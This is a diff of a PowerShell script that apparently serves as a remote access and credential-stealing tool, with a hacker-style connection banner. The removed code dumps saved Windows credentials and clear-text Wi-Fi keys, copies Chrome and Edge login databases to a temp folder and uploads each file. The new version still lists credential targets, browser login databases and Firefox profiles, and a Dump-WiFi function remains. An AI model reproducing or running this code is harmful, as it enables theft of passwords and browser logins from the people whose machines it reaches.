@@ -389,56 +389,36 @@ function PortSuggest {
 
     function Get-Credentials {
     try {
-        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-        $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like "192.168.*" })[0].IPAddress
-        $outDir = "$env:TEMP\creds_$timestamp"
-        New-Item -ItemType Directory -Path $outDir -Force | Out-Null
+        $output = ""
 
-        # 1. Windows Credentials
-        $windowsCreds = Join-Path $outDir "windows.txt"
-        cmdkey /list | Out-File $windowsCreds -Encoding UTF8
-
-        # 2. Wi-Fi passwords
-        $wifiFile = Join-Path $outDir "wifi.txt"
-        netsh wlan show profiles | ForEach-Object {
-            if ($_ -match "All User Profile\s*:\s*(.*)") {
-                $profile = $matches[1].Trim()
-                $key = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
-                "`n$profile : $($key -replace '.*Key Content\s*:\s*','')" | Out-File $wifiFile -Append -Encoding UTF8
-            }
+        # 1. Windows Credential Manager (generic credentials)
+        $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
+            $target = $_.ToString().Split(":")[1].Trim()
+            $output += "`n[TARGET] $target"
         }
 
-        # 3. Chrome login DB
-        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        if (Test-Path $chromePath) {
-            Copy-Item $chromePath (Join-Path $outDir "chrome_login.db") -Force
+        # 2. Chrome saved logins (мета-данные — без дешифровки)
+        $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        if (Test-Path $chromeLoginPath) {
+            $output += "`n[+] Chrome login database found: $chromeLoginPath"
         }
 
-        # 4. Firefox profiles list
-        $firefoxFile = Join-Path $outDir "firefox.txt"
-        Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue | ForEach-Object {
-            $_.FullName | Out-File $firefoxFile -Append -Encoding UTF8
+        # 3. Firefox профили (только список профилей)
+        $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
+        foreach ($profile in $firefoxProfiles) {
+            $output += "`n[+] Firefox profile: $($profile.FullName)"
         }
 
-        # 5. Edge login DB
-        $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
-        if (Test-Path $edgePath) {
-            Copy-Item $edgePath (Join-Path $outDir "edge_login.db") -Force
+        if ([string]::IsNullOrWhiteSpace($output)) {
+            return "[INFO] No credentials found or access denied."
         }
 
-        # 6. Отправляем каждый файл отдельно
-        $result = ""
-        Get-ChildItem -Path $outDir | ForEach-Object {
-            $result += Upload-File $_.FullName + "`n"
-        }
-
-        return $result.TrimEnd()
+        return $output
     }
     catch {
         return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
     }
 }
-
     
     function Dump-WiFi {
     netsh wlan show profiles | ForEach-Object {
@@ -657,7 +637,6 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|                                                                                                                                                                        
-                                        ( TESTING :  )
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
